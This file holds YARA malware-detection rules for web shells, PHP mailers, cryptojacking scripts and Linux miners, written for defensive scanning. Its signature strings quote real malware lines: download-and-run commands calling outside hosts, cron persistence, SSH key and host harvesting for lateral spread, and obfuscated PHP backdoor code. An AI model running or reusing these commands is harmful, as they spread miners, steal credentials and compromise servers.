/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-11-25
   Identifier: 11-25-18
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule c254853a {
   meta:
      description = "11-25-18 - file c254853a.ico"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-11-25"
      hash1 = "8a3d52b376a67a7833906ab4307e6614747c5c636768fc92b29f46735cdaa43d"
   strings:
      //$s1 = "7*//*ap*/)/*382s*/ + 1/*bicrk*/)/*qe*/, 0, strlen/*7cyz*/(/*9*/$_oye1xlj/*6bnu*/)/*mi9js*//*4t*/)/*anrlf*//*2zp*/)/*sou9m*/;" fullword ascii
      //$s2 = "sryu%3Cj%3FA%27-tozz%3B%3D2%01q%26m%14a%279a%2F%7B2ptk%252iaov%28%7Cy3%7B3s%7Bplm7%28-x8%238.5%21wh%3E%21ttslcwl%29%2Ai-%3D%7B" fullword ascii
      $s3 = "$_7il4m0k = basename/*1*/(/*2ro*/trim/*ag*/(/*j*/preg_replace/*vz*/(/*ds*/rawurldecode/*o*/(/*s4r9*/\"%2F%5C%28.%2A%24%2F\"/*085" ascii
      $s4 = "//61c050381e48e384c943fc94caeb742bb83%3Dy%20ko%26sses%3C7%22%3A%3B%2Ad%60da%3B%0Bs%20%2A%23mpnfkit%20%3Er%3E%3E1ogha~ce%60i9ks%7" ascii

   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 200KB and
         ( all of them )
      ) or ( all of them )
}

rule class_12371 {
   meta:
      description = "case109 - file class.12371.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "59c3a1fe5fb0bc3033e4330e7ff061658d7dd5149834aeecef09243584ebdaa7"
   strings:
      //$s1 = "header(\"HTTP/1.0 404 Not Found\");" fullword ascii
      $s2 = "if (@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {" fullword ascii
      $s3 = "error_reporting(E_ALL & ~E_NOTICE);" fullword ascii
      //$s4 = "ize=\"50\"><input name=\"ups\" type=\"submit\" id=\"ups\" value=\"go\"></form>';" fullword ascii
      $s5 = "if ($_POST['ups'] == \"go\") {" fullword ascii
      $s6 = "@include($_FILES['u']['tmp_name']);" fullword ascii
      $s7 = "$t1 = $m ? stripslashes($_REQUEST[\"t1\"]) : $_REQUEST[\"t1\"];" fullword ascii
   condition:
      all of them 
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-30
   Identifier: miner3
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_30_18_kon {
   meta:
      description = "miner3 - file kon"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "8e14e55e7c89bf67cf67d1f945c55fbbdc92bafbd4113f87c88336da76c7a01b"
   strings:
      $x1 = "var=$(grep . wprx) && var2=$(grep . mip) && curl --socks5 $var -o templistge.txt http://37.72.175.148/npan/che.php?myip=$var2" fullword ascii
      $x2 = "var=$(grep . wprx) && var2=$(grep . mip) && curl --socks5 $var -o config.json http://37.72.175.148/npan/command.php?myip=$var2" fullword ascii
      $x3 = "var=$(grep . wprx) && var2=$(grep . mip) && curl --socks5 $var -o comm.php http://37.72.175.148/npan/comm.php?myip=$var2" fullword ascii
      $x4 = "grep -q \"download\" \"comm.php\"; if [ $? -eq 0 ]; then touch download.txt; fi" fullword ascii
      $s5 = "curl -o prx http://pastebin.com/raw/i6uHVPMQ ;shuf -n 1 prx > wprx;rm prx;" fullword ascii
      $s6 = "var4=$(grep . namic.txt) && var5=$(grep . link.txt) && chmod 0777 $var4 || curl -o $var4 $var5 && chmod 0777 $var4" fullword ascii
      $s7 = "var=$(grep . wprx) && var2=$(grep . mip) && curl --socks5 $var http://37.72.175.148/npan/bt.php?myip=$var2" fullword ascii
      $s8 = "grep -q \"tasks\" \"comm.php\"; if [ $? -eq 0 ]; then touch ntastk.txt; fi" fullword ascii
      $s9 = "grep -q \"imnewww\" \"comm.php\"; if [ $? -eq 0 ]; then touch imnew.txt; fi" fullword ascii
      $s10 = "echo \"*/4 * * * * pidof knox || exec $PWD/knox >/dev/null 2>&1 &\" | crontab -" fullword ascii
      $s11 = "chmod 0777 knox || wget http://migdalworld.org/wp-includes/images/media/mi/123/123/knox && chmod 0777 knox" fullword ascii
      $s12 = "var4=$(grep . namic.txt) && var=$(pidof $var4) && echo $var>pidi.txt && var2=$(grep . pidi.txt) && kill 9 $var2 && rm pidi.txt" fullword ascii
      $s13 = "grep -q \"minwor\" \"templistge.txt\"; if [ $? -eq 0 ]; then rm templistge.txt && touch minr_here.txt; else rm templistge.txt; f" ascii
      $s14 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s15 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s16 = "download.txt" fullword ascii
      $s17 = "curl -V;if [ $? -eq 0 ]; then touch curn.txt;fi;" fullword ascii
      $s18 = "var=$(grep . wprx) && var4=$(grep . namic.txt) && var5=$(grep . link.txt) && chmod 0777 $var4 || curl --socks5 $var -o $var4 $va" ascii
      $s19 = "var=$(grep . wprx) && var4=$(grep . namic.txt) && var5=$(grep . link.txt) && chmod 0777 $var4 || curl --socks5 $var -o $var4 $va" ascii
      $s20 = "var=$(grep . wprx) && var2=$(cat /etc/issue.net | sed 's/ /+/g' | cut -f 4) && var3=$(grep . mip) && curl --socks5 $var \"http:/" ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 40KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_09_30_18_cloki {
   meta:
      description = "miner3 - file cloki"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "3e7a3c01b4e7134909ec9ced955a82d77606e49d03ae0c25d666fad0b4d80f8f"
   strings:
      $x1 = "grep -q \"download\" \"comm.php\"; if [ $? -eq 0 ]; then touch download.txt; fi" fullword ascii
      $s2 = "curl -o prx http://pastebin.com/raw/i6uHVPMQ ;shuf -n 1 prx > wprx;rm prx;" fullword ascii
      $s3 = "grep -q \"tasks\" \"comm.php\"; if [ $? -eq 0 ]; then touch ntastk.txt; fi" fullword ascii
      $s4 = "grep -q \"imnewww\" \"comm.php\"; if [ $? -eq 0 ]; then touch imnew.txt; fi" fullword ascii
      $s5 = "var4=$(cat namic.txt) && var5=$(cat link.txt) && chmod 0777 $var4 || curl -o $var4 $var5 && chmod 0777 $var4" fullword ascii
      $s6 = "grep -q \"minwor\" \"templistge.txt\"; if [ $? -eq 0 ]; then rm templistge.txt && touch minr_here.txt; else rm templistge.txt; f" ascii
      $s7 = "(cat /var/lib/dbus/machine-id || ifconfig | grep HWaddr || uname -a || lspci ) | md5sum |cut -d\" \" -f1 > udic" fullword ascii
      $s8 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s9 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s10 = "rm link* namic* mip* comm* udic* pidi.txt" fullword ascii
      $s11 = "var4=$(cat namic.txt) && var=$(pidof $var4) && echo $var>pidi.txt && var2=$(cat pidi.txt) && kill 9 $var2 && rm pidi.txt" fullword ascii
      $s12 = "var2=$(grep -Eio \"[^tasks(].*[^)]\" \"comm.php\") && $var2" fullword ascii
      $s13 = "download.txt" fullword ascii
      $s14 = "curl -V;if [ $? -eq 0 ]; then touch curn.txt;fi;" fullword ascii
      $s15 = "var4=$(cat namic.txt) && $PWD/$var4 > /dev/null > /dev/null &" fullword ascii
      $s16 = "curl --connect-timeout 10 -o mip inet-ip.info || curl --connect-timeout 10 -o mip icanhazip.com || curl --connect-timeout 10 -o " ascii
      $s17 = "curl --connect-timeout 10 -o mip inet-ip.info || curl --connect-timeout 10 -o mip icanhazip.com || curl --connect-timeout 10 -o " ascii
      $s18 = "0 -o comH" fullword ascii
      $s19 = "imnew.txt" fullword ascii
      $s20 = "ntastk.txt" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 50KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_09_30_18_byte {
   meta:
      description = "miner3 - file byte"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-30"
      hash1 = "ee72b7faaa2618860c96e90768ba8afd39757c4e0614732927b4fbd67a4283b9"
   strings:
      $x1 = "grep -q \"download\" \"comm.php\"; if [ $? -eq 0 ]; then touch download.txt; fi" fullword ascii
      $s2 = "curl -o prx http://pastebin.com/raw/bzqUHJg9 ;shuf -n 1 prx > wprx;rm prx;" fullword ascii
      $s3 = "-o templistge.txt \"http://91.215.153.55/novys/che.php?suid=" fullword ascii
      $s4 = "grep -q \"tasks\" \"comm.php\"; if [ $? -eq 0 ]; then touch ntastk.txt; fi" fullword ascii
      $s5 = "grep -q \"imnewww\" \"comm.php\"; if [ $? -eq 0 ]; then touch imnew.txt; fi" fullword ascii
      $s6 = "-o config.json \"http://91.215.153.55/novys/command.php?suid=" fullword ascii
      $s7 = "var4=$(cat namic.txt) && var5=$(cat link.txt) && chmod 0777 $var4 || curl -o $var4 $var5 && chmod 0777 $var4" fullword ascii
      $s8 = "grep -q \"minwor\" \"templistge.txt\"; if [ $? -eq 0 ]; then rm templistge.txt && touch minr_here.txt; else rm templistge.txt; f" ascii
      $s9 = "-o comm.php \"http://91.215.153.55/novys/comm.php?suid=" fullword ascii
      $s10 = "(cat /var/lib/dbus/machine-id || ifconfig | grep HWaddr || uname -a || lspci ) | md5sum |cut -d\" \" -f1 > udic" fullword ascii
      $s11 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s12 = "var2=$(grep -Eio \"[^download(].*[^)]\" \"comm.php\") && echo $var2>link.txt && var3=$(grep -Eio \"[^/]*$\" \"link.txt\") && ech" ascii
      $s13 = "rm link* namic* mip* comm* udic* pidi.txt" fullword ascii
      $s14 = "|| wget http://migdalworld.org/wp-includes/images/media/mi/novys/" fullword ascii
      $s15 = "var4=$(cat namic.txt) && var=$(pidof $var4) && echo $var>pidi.txt && var2=$(cat pidi.txt) && kill 9 $var2 && rm pidi.txt" fullword ascii
      $s16 = "var2=$(grep -Eio \"[^tasks(].*[^)]\" \"comm.php\") && $var2" fullword ascii
      $s17 = "download.txt" fullword ascii
      $s18 = "curl -V;if [ $? -eq 0 ]; then touch curn.txt;fi;" fullword ascii
      $s19 = "\"http://91.215.153.55/novys/bt.php?suid=" fullword ascii
      $s20 = "var4=$(cat namic.txt) && $PWD/$var4 > /dev/null > /dev/null &" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 50KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule cpanel_brute_force_tool_brutus
{

    meta:
       author = "Brian Laskowski"
       info = " cpanel brute force tool 05-14-18 "

    strings:
  	$a= "$password=array_unique"
	$b= "$username=array_unique"
	$c= "$start=time"
	$d= "explode"

    condition:
    all of them
}

rule CPR4616_Webshell

{
        meta:
        author= "Brian Laskowski"
        info= " php webshell sighted 05/10/18 https://www.virustotal.com/#/file/266ae931e817c701fd4098d37edfdfcc814a02e0820f72c659e0c11f6e2cf070/detection "

        strings:
		$a= "$auth_pass ="
		$b= "$eval=("
		$c= ".gzuncompress(base64_decode"
		$d= "?php"
		$e= "?>"

        condition:
                all of them
}

rule bad_packets_crypto_jacking_0
{
	meta: 
	author= "Brian Laskowski"
	info= " https://badpackets.net/large-cryptojacking-campaign-targeting-vulnerable-drupal-websites/ "

	strings:
		$a = "var RqLm1=window"
		$b = "var D2=window"
	
	condition:
		all of them
}

rule bad_packets_crypto_jacking_1
{
	meta: 
	author= "Brian Laskowski"
	info= " https://badpackets.net/large-cryptojacking-campaign-targeting-vulnerable-drupal-websites/ "

	strings:
		$a = "var dZ1= window"
		$b = "var ZBRnO2= window"
	
	condition:
		all of them
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-26
   Identifier: case139
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule crypto_jacking_signatures {
   meta:
      description = "case139 - file main.js"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-26"
   strings:
      $s1 = "coinhive.min.js"
      $s2 = "wpupdates.github.io/ping"
      $s3 = "cryptonight.asm.js"
      $s4 = "coin-hive.com"
      $s5 = "jsecoin.com"
      $s6 = "cryptoloot.pro"
      $s7 = "webassembly.stream"
      $s8 = "ppoi.org"
      $s9 = "xmrstudio"
      $s10 = "webmine.pro"
      $s11 = "miner.start"
      $s12 = "allfontshere.press"
      $s13 = "freecontent.bid"
      $s14 = "freecontent.date"
      $s15 = "freecontent.faith"
      $s16 = "freecontent.party"
      $s17 = "freecontent.science"
      $s18 = "freecontent.stream"
      $s19 = "freecontent.trade"
      $s20 = "hostingcloud.accountant"
      $s21 = "hostingcloud.bid"
      $s22 = "hostingcloud.date"
      $s23 = "hostingcloud.download"
      $s24 = "hostingcloud.faith"
      $s25 = "hostingcloud.loan"
      $s26 = "jshosting.bid"
      $s27 = "jshosting.date"
      $s28 = "jshosting.download"
      $s29 = "jshosting.loan"
      $s30 = "jshosting.party"
      $s31 = "jshosting.racing"
      $s32 = "jshosting.review"
      $s33 = "jshosting.stream"
      $s34 = "jshosting.trade"
      $s35 = "jshosting.win"

   condition:
      any of them
}

rule cache_mailer
{

	meta:
	   author = "Brian Laskowski"
	   info = " php mailer script "

	strings:
	
	$s1="if (mail(stripslashes(base64_decode($fr[0]))"

	condition:
	all of them
}

rule cache_mailer_encoded_1
{

	meta:
	  author = "Brian Laskowski"
	  info = " obfuscated php shell "

	strings:

	$s1="pod_h1kgzu0cqr"

	condition:
	all of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-05
   Identifier: miners
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule case25_miners_shared {
   meta:
      description = "miners - file shared"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-05"
      hash1 = "9e69143530f6ccb30f813f3d9f0b5dfb51779999dcfe06784d2720ad057d8316"
   strings:
      $s1 = "2526272829" ascii /* hex encoded string '%&'()' */
      $s2 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s3 = "RkeyedWo" fullword ascii
      $s4 = "failures" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 1000KB and
         ( all of them )
      ) or ( all of them )
}

rule case25_miners_kserviced {
   meta:
      description = "miners - file kserviced"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-05"
      hash1 = "6c9b44df7caa65cb7f652f411b38f8b49564e3ae265aa75a2c6d0acda22ea20f"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "40,*###($ " fullword ascii /* hex encoded string '@' */
      $s3 = "$3D$5D$ '" fullword ascii /* hex encoded string '=]' */
      $s4 = "** HUGE PA" fullword ascii
      $s5 = "RkeyedW;" fullword ascii
   condition:
      ( uint16(0) == 0x457f and
         filesize < 1000KB and
         ( all of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-05
   Identifier: shells
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_case25_shells_1119 {
   meta:
      description = "shells - file 1119.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-05"
      hash1 = "bcdebcaffcbd0ff1ff38b0d36c252b17b2c6856d45b1084c7b007fae5f26bdc6"
   strings:
      $s1 = "<?php $D=strrev('edoced_46esab');$s=gzinflate($D('7X1te9s2suh3/QqY1QZiItGSnHSzkinbTZxN7uZtY2fbXttHpSRKYi2RKkn5pa7/+50ZACT4JsvZ7t" ascii
      $s2 = "UOtUciBgDSdi1cx29sQissaItIRfq3oZyDwDFMek6F0zSJUpWGtRC6UbAOUSE6RVUZ3gIgnYzQMJPyePi+nsNaaOwcTt0AjuFTPDhDFp6ap6idh6Rmp919DshX40UQIT" ascii
      $s3 = "wiAk2QdhN24daA5qhEcK9HWqAgjY06BvVqUhS2Zh1P0M36ZERKvjQgSYooseWgMJQyroPIpvcMD0V4ymrkZL9gSjdSJk4x2YARM4GYiiaP5JE2DFOUhRn+xsMBU7/sF8" ascii
      $s4 = "dzOpHV6mGkGLND1PvJyb0v+D62R5yMoEE0RmX/xHMvkkdGY4D7DM1AtnBGIPEZn52ZqxRJxMn0rUnuI1QApouoldos56kbwuRl7z6rQZKTOjmHGuLv8Oj16y/GhRh1Uf" ascii
      $s5 = "qOeLOtZyydm6F7447XOCDD2Fu6AgAy6Wu48JZe3FBJS2fmjYe/rYPYjYbh2kcQzKRRmOUBZqtxAzo3Xfs03uynKA69VbRworkbNeo0COZd6Mbr0GdeNBSjItMP6A8gXD" ascii
      $s6 = "iGyWqOTBSCz8Pz+Pycn7cNMpkHqVhOJRVcgOZXU2jG8DdkY5wMBvTVJP0CTdHEHNWC+jds1lK6udOOBih9YnLVOUA6/Fgrdpd6pPTvlXcAzw6BvEEna7EYCJ9XllEiRR" ascii
      $s7 = "z00zCVzYyqqfpm4Bj+ZG+56aL3xeqG7roF0ZlenEg0Cm7k5QxQTaLqCAu27Uf2gEtyK6M2hrbXwEUxWMXR/zr6Sd1Y4DlX0EQwF9VgqK+MNjk7YoE82zk0EEgPzhk9Q2" ascii
      $s8 = "XSRov8r0wtrMggbd0oBoy6tlQ7wRQ2xgh2NP0CaqOwLd6BatCLnHQfOpzA0S8MyD2IFMKjW1e+U1iM76neicLywqdfs5az+S0GqSQhTiquttfrmKLyE/QUZXPg7iPX9e" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 50KB and
         ( all of them )
      ) or ( all of them )
}

rule news_parser_class {
   meta:
      description = "shells - file news_parser.class.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-05"
      hash1 = "1d47cfee87e3dded792528442c0a7d7b71df956697a87da4c389fc1f89821d78"
   strings:
      $s1 = "ygnYWN0aW9uJyAuICRfUE9TVFsnYSddKSApDQoJY2FsbF91c2VyX2Z1bmMoJ2FjdGlvbicgLiAkX1BPU1RbJ2EnXSk7DQpleGl0Ow0K\";" fullword ascii
      $s2 = "jNSdllubHVZVzFsS0NkMFkzQW5LU2tnZkh3Z1pHbGxJQ0pEWVc1MElHTnlaV0YwWlNCemIyTnJaWFJjYmlJN0RRcHpaWFJ6YjJOcmIzQjBLRk1zVTA5TVgxTlBRMHRGV" ascii
      $s3 = "mV0Y2goJGRiLT5xdWVyeSgnU0VMRUNUIENPVU5UKCopIGFzIG4gRlJPTSAnLiR2YWx1ZS4nJykpOw0KCQkJCQkkdmFsdWUgPSBodG1sc3BlY2lhbGNoYXJzKCR2YWx1Z" ascii
      $s4 = "iBwb3NpeF9nZXRwd3VpZCgkcCkge3JldHVybiBmYWxzZTt9IH0NCmlmICghZnVuY3Rpb25fZXhpc3RzKCJwb3NpeF9nZXRncmdpZCIpICYmIChzdHJwb3MoJEdMT0JBT" ascii
      $s5 = "Xh0YXJlYSxzZWxlY3R7IG1hcmdpbjowO2NvbG9yOiNmZmY7YmFja2dyb3VuZC1jb2xvcjojNTU1O2JvcmRlcjoxcHggc29saWQgJGNvbG9yOyBmb250OiA5cHQgTW9ub" ascii
      $s6 = "gkJCQlicmVhazsNCgkJCQljYXNlICdwZ3NxbCc6DQoJCQkJCSR0aGlzLT5xdWVyeSgnU0VMRUNUICogRlJPTSAnLiR0YWJsZSk7DQoJCQkJCXdoaWxlKCRpdGVtID0gJ" ascii
      $s7 = "mE7YmFja2dyb3VuZC1jb2xvcjojMjIyO21hcmdpbjowcHg7IH0NCmRpdi5jb250ZW50eyBwYWRkaW5nOiA1cHg7bWFyZ2luLWxlZnQ6NXB4O2JhY2tncm91bmQtY29sb" ascii
      $s8 = "3NwYWNlLCdDb3VyaWVyIE5ldyc7IH0NCmZvcm17IG1hcmdpbjowcHg7IH0NCiN0b29sc1RibHsgdGV4dC1hbGlnbjpjZW50ZXI7IH0NCi50b29sc0lucHsgd2lkdGg6I" ascii
      $s9 = "CRuOyRpKyspIHsNCgkJJG93ID0gQHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoJGRpckNvbnRlbnRbJGldKSk7DQoJCSRnciA9IEBwb3NpeF9nZXRncmdpZChAZmlsZ" ascii
      $s10 = "XNwbGF5Om5vbmU7JzonJykuIm1hcmdpbi10b3A6NXB4JyBpZD0nc3RyT3V0cHV0Jz4iOw0KCWlmKCFlbXB0eSgkX1BPU1RbJ3AxJ10pKSB7DQoJCWlmKGluX2FycmF5K" ascii
      $s11 = "$string = \"Z2xvYmFsICRhdXRoX3Bhc3MsJGNvbG9yLCRkZWZhdWx0X2FjdGlvbiwkZGVmYXVsdF91c2VfYWpheCwkZGVmYXVsdF9jaGFyc2V0LCRzb3J0Ow0KZ2xv" ascii
      $s12 = "$alphabet = \".hyib/;dq4ux9*zjmclp3_r80)t(vakng1s2foe75w6\";" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 300KB and
         ( 8 of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-06-04
   Identifier: case116
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_06_04_18_case116_a_crypto_miner_persistence_shell {
   meta:
      description = "case116 - file a.sh"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-06-04"
      hash1 = "6149658a4e8cdcbb610429c376b676da5f2dfb17970dc09b0020052c981074bb"
   strings:
      $x1 = "yes yes| ssh -oStrictHostKeyChecking=no -i $key $user@$host  \"$WGET /dev/null $XMHTTP/YEY__$payload;$WGET -O /tmp/.XO-lock" fullword ascii
      $x2 = "yes yes| ssh -oStrictHostKeyChecking=no -i $key $user@$host  \"$WGET /dev/null $XMHTTP/YEY__$payload;$WGET -O /tmp/.XO-lock $XMH" ascii
      $x3 = "$XMHTTP/a.sh;curl -o /dev/null $XMHTTP/CYEY__$payload;curl -o /tmp/.XO-lock $XMHTTP/a.sh; sh /tmp/.XO-lock\"&" fullword ascii
      $x4 = "echo \"*/30 * * * * root  $WGET /tmp/.XO-lock $XMHTTP/a.sh;sh /tmp/.XO-lock;rm /tmp/.XO-lock\" >> /etc/crontab" fullword ascii
      $s5 = "payload=$(echo \".$me.$mykey.$key.$user@$host\") #|base64 -w0)" fullword ascii
      $s6 = "USERS=$(echo $USERS|tr ' ' '\\n'|sort|uniq|grep -v \"/bin/bash\"|grep -v \"~\"|grep -v \"/\"|grep -v keygen|grep -v \"\\-\\-help" ascii
      $s7 = "\".ssh\"|grep -v \"ssh-agent\"|grep -v sshpass|grep -v \"\\-l\"|grep -v \"\\&\")" fullword ascii
      $s8 = "KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep IdentityFile|awk -F \"IdentityFile\" '{print $2 }')" fullword ascii
      $s9 = "HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config|grep HostName|awk -F \"HostName\" '{print $2}')" fullword ascii
      $s10 = "echo \"ssh -oStrictHostKeyChecking=no -i $key $user@$host\"" fullword ascii
      $s11 = "HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts| grep -oP \"([0-9]{1,3}\\.){3}[0-9]{1,3}\")" fullword ascii
      $s12 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN1  -k --donate-level 1 --cpu-priority 4 -B" fullword ascii
      $s13 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN6  -k --donate-level 1 --cpu-priority 4 -B" fullword ascii
      $s14 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN4  -k --donate-level 1 --cpu-priority 4 -B " fullword ascii
      $s15 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN5  -k --donate-level 1 --cpu-priority 4 -B" fullword ascii
      $s16 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN3  -k --donate-level 1 --cpu-priority 4 -B " fullword ascii
      $s17 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN2 -k --donate-level 1 --cpu-priority 4 -B " fullword ascii
      $s18 = "KEYS=$(find ~/ /root /home -maxdepth 2 -name '\\.ssh'|xargs find|awk '/pub|pem/')" fullword ascii
      $s19 = "proc=`grep -c ^processor /proc/cpuinfo`" fullword ascii
      $s20 = "$REP/.jnks/chron-34e2fg -o $POOL -u $USERID$BIN4  -k --donate-level 1  -B" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and
         filesize < 30KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-25
   Identifier: shell2
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_25_18_site_version {
   meta:
      description = "shell2 - file site-version.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-25"
      hash1 = "b131f3261fd40891decdcc5df429b2abb50cb12827a94cbaf994e29974affd38"
   strings:
      $s1 = "* Show Site Version Administration Settings" fullword ascii
      $s2 = "/** Show Enrcypted WordPress Version */" fullword ascii
      $s3 = "$p28 = \"\\x70\\x72\\x65\\x67\\x5F\\x72\\x65\\x70\\x6C\\x61\\x63\\x65\";" fullword ascii
      $s4 = "if ($_REQUEST['wp_version_info']) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_09_25_18_Parser {
   meta:
      description = "shell2 - file Parser.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-25"
      hash1 = "bc3658527871f653b7034dc05e4e5f5f589723e273da2fc7a9ea6c4045e6dc7f"
   strings:
      $s1 = "* Descriptor" fullword ascii
      $s2 = "* Request Parser Variables" fullword ascii
      $s3 = "* Show Parser UTF-8 Chars" fullword ascii
      $s4 = "$p28 = \"\\x70\\x72\\x65\\x67\\x5F\\x72\\x65\\x70\\x6C\\x61\\x63\\x65\";" fullword ascii
      $s5 = "* Router" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 40KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_09_25_18_webr00tv3 {
   meta:
      description = "shell2 - file webr00tv3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-25"
      hash1 = "c9c6155d2f88fe2e651768dd1f5dc69fb8470c612dd46488d2b475a004036026"
   strings:
      $x1 = "<?php $OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000" ascii
      $s2 = "SUlsSUk9J2ZpbGUnOyRJSUlJSUlJSUlJMUk9J3N5bWxpbmsnOyRJSUlJSUlJSUlJbDE9J2Z3cml0ZSc7JElJSUlJSUlJSUlsbD0nZm9wZW4nOyRJSUlJSUlJSUlJSWw9" ascii /* base64 encoded string 'IIlII='file';$IIIIIIIIII1I='symlink';$IIIIIIIIIIl1='fwrite';$IIIIIIIIIIll='fopen';$IIIIIIIIIIIl=' */
      $s3 = "SUlJSWwxSTFJPSdoaWdobGlnaHRfZmlsZSc7JElJSUlJSUlsMUlsMT0nc2hvd19zb3VyY2UnOyRJSUlJSUlJbDFJbGw9J2h0bWxlbnRpdGllcyc7JElJSUlJSUlsMUls" ascii /* base64 encoded string 'IIIIl1I1I='highlight_file';$IIIIIIIl1Il1='show_source';$IIIIIIIl1Ill='htmlentities';$IIIIIIIl1Il' */
      $s4 = "bGxsSUk9J2h0bWxzcGVjaWFsY2hhcnMnOyRJSUlJSUlJbGxJSTE9J2NobW9kJzskSUlJSUlJSWxsSUlsPSdiYXNlNjRfZGVjb2RlJzskSUlJSUlJSWxJMTFJPSdmY2xv" ascii /* base64 encoded string 'lllII='htmlspecialchars';$IIIIIIIllII1='chmod';$IIIIIIIllIIl='base64_decode';$IIIIIIIlI11I='fclo' */
      $s5 = "ST0nZnJlYWQnOyRJSUlJSUlJbGwxbGw9J3N0cmlwY3NsYXNoZXMnOyRJSUlJSUlJbGwxSTE9J2ZpbGVzaXplJzskSUlJSUlJSWxsMUlJPSd1bmxpbmsnOyRJSUlJSUlJ" ascii /* base64 encoded string 'I='fread';$IIIIIIIll1ll='stripcslashes';$IIIIIIIll1I1='filesize';$IIIIIIIll1II='unlink';$IIIIIII' */
